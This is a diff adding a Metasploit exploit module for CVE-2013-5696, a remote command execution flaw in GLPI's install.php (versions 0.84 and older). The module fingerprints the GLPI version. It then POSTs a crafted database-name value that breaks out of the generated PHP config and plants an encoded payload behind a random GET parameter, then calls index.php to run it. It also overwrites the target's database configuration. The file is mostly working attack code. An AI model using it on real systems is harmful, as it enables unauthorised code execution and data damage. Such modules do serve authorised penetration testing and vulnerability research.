@@ -1,0 +1,113 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ManualRanking # Application database configuration is overwritten
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'GLPI install.php Remote Command Execution',
+      'Description'    => %q{
+        This module exploits an arbitrary command execution vulnerability in the
+        GLPI 'install.php' script. Users should use this exploit at his own risk,
+        since it's going to overwrite database configuration.
+      },
+      'Author'         =>
+        [
+          'Tristan Leiter < research[at]navixia.com >', # Navixia Research Team
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2013-5696' ],
+          [ 'URL', 'https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html' ],
+          [ 'URL', 'http://www.glpi-project.org/forum/viewtopic.php?id=33762' ],
+        ],
+      'Privileged'     => false,
+      'Platform'       => ['php'],
+      'Payload'        =>
+        {
+          'Space'       => 4000,
+          'BadChars'    => "#",
+          'DisableNops' => true,
+          'Keys'        => ['php']
+        },
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [[ 'GLPI 0.84 or older', { }]],
+      'DisclosureDate' => 'Sep 12 2013',
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to GLPI', '/glpi/'])
+        ], self.class)
+  end
+
+  def uri
+    return target_uri.path
+  end
+
+  def check
+    # Check if the GLPI instance is vulnerable
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(uri, 'index.php'),
+    })
+
+    if not res or res.code != 200
+      return Exploit::CheckCode::Safe
+    end
+
+    re = '(version)(\\s+)(.*)(\\s+)(Copyright)'
+    m = Regexp.new(re, Regexp::IGNORECASE)
+    matched = m.match(res.body)
+    if matched and matched[3] =~ /0.(8[0-4].[0-1])|([0-7][0-9].[0-9])/
+      print_good("Detected Version : #{matched[3]}")
+      return Exploit::CheckCode::Appears
+    elsif matched
+      print_error("Version #{matched[3]} is not vulnerable")
+    end
+    return Exploit::CheckCode::Safe
+
+  end
+
+  def exploit
+    print_status("Injecting the payload...")
+    rand_arg = Rex::Text.rand_text_hex(10)
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(uri, 'install/install.php'),
+      'vars_post' =>
+      {
+        'install'      => 'update_1',
+        'db_host'      => 'localhost',
+        'db_user'      => 'root',
+        'db_pass'      => 'root',
+        'databasename' =>"'; } if(isset($_GET['#{rand_arg}'])){ #{payload.encoded} } /*"
+      }
+    })
+
+    unless res and res.code == 200 and res.body =~ /You will update the GLPI database/
+      print_warning("Unexpected response while injecting the payload, trying to execute anyway...")
+    end
+
+    print_status("Executing the payload...")
+    send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(uri, 'index.php'),
+      'vars_get'  =>
+      {
+        rand_arg => '1',
+      }
+    })
+  end
+
+end
